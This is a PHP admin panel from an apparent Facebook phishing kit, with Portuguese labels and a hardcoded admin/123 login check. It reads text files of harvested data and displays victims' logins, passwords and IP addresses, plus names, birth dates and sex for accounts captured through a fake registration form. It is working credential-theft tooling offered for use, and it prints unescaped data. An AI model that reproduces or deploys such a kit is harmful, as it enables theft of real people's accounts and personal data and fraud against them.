<?php
//by: Davyd Maker

error_reporting(0);
session_start();
if($_SESSION["usuario"] == "admin" && $_SESSION["senha"] == "123"){
if($_GET['logout'] == "s"){
	session_destroy();
	header('Location: ../');
}
	?>
<html>
<head>
	<title>Admin - Phishing Facebook</title>
	<link rel="stylesheet" type="text/css" href="estilo.css"/>
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<meta charset="utf-8"/>
	<meta name="robots" content="NOINDEX, NOFOLLOW"/>
</head>
<body>
	<center>
	<h1><font color="white" size="7">Phishing Facebook</font></h1><br/><br/>
	<h3><font color="white" size="4"><u>Contas Logadas</u></h3></font>
	<?php 		
		if(file_exists("logins12j3h41krhg.txt")){
		$linhas = file("logins12j3h41krhg.txt");

		echo "<table border='1' cellspacing='1'>";
		echo "<th><font color='lime'>Login</font></th>";
		echo "<th><font color='lime'>Senha</font></th>";
		echo "<th><font color='white'>Logado</font></th>";
		echo "<th><font color='white'>IP</font></th>";

		for($i = 0; $i < count($linhas); $i++){
			list($login,$senha,$data,$ip) = explode("/BIRRL/",$linhas[$i]);
			echo "<tr><td width='160' align='center'><font color='#00FF33'>".$login."</font></td>";
			echo "<td width='160' align='center'><font color='#00FF33'>".$senha."</font></td>";
			echo "<td width='160' align='center'>".$data."</td>";
			echo "<td width='160' align='center'>".$ip."</td></tr>";
		}

		echo "</table>";
		}else{
			echo "<font color='#FF0033' size='2'>Arquivo de Contas Logadas não encontrado.</font>";
		}
	?><br/><br/><br/>

	<h3><font color="white" size="4"><u>Contas Registradas</u></h3></font>
	<?php 		
		if(file_exists("cadastros18byrvnhqfc.txt")){
		$linhas = file("cadastros18byrvnhqfc.txt");

		echo "<table border='1' cellspacing='1'>";
		echo "<th><font color='white'>Nome</font></th>";
		echo "<th><font color='white'>Sobrenome</font></th>";
		echo "<th><font color='lime'>Login</font></th>";
		echo "<th><font color='lime'>Senha</font></th>";		
		echo "<th><font color='white'>Data de Nascimento</font></th>";
		echo "<th><font color='white'>Sexo</font></th>";
		echo "<th><font color='white'>Registrado</font></th>";
		echo "<th><font color='white'>IP</font></th>";

		for($i = 0; $i < count($linhas); $i++){
			list($nome,$sobrenome,$login,$senha,$data_nascimento,$sexo,$registrado,$ip) = explode("/BIRRL/",$linhas[$i]);
			echo "<tr><td align='center'>".$nome."</td>";
			echo "<td align='center'>".$sobrenome."</td>";
			echo "<td align='center'><font color='#00FF33'>".$login."</font></td>";
			echo "<td align='center'><font color='#00FF33'>".$senha."</font></td>";
			echo "<td align='center'>".$data_nascimento."</td>";
			echo "<td align='center'>".$sexo."</td>";
			echo "<td align='center'>".$registrado."</td>";
			echo "<td align='center'>".$ip."</td></tr>";
			}

		echo "</table>";
		}else{
			echo "<font color='#FF0033' size='2'>Arquivo de Contas Registradas não encontrado.</font>";
		}
	?><br/><br/>
	<a href=""><input type="submit" name="atualizar" value="Atualizar" class="botaoEnviar"/></a>
	<a href="?logout=s"><input type="submit" name="sair" value="Sair" class="botaoSair"/></a>
	</center>
</body>
</html><?php
}else{
	header('Location: ../');
}?>
